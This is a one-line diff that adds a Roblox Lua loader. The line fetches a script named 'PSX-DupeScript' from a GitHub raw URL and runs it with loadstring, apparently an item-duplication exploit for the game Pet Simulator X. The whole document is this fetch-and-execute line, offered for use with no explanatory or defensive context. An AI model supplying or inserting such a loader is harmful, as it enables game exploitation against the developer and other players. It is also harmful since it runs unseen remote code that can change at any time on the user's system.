@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/OTFonTop/PSX-Dupescript/main/PSX-DupeScript.lua'))()
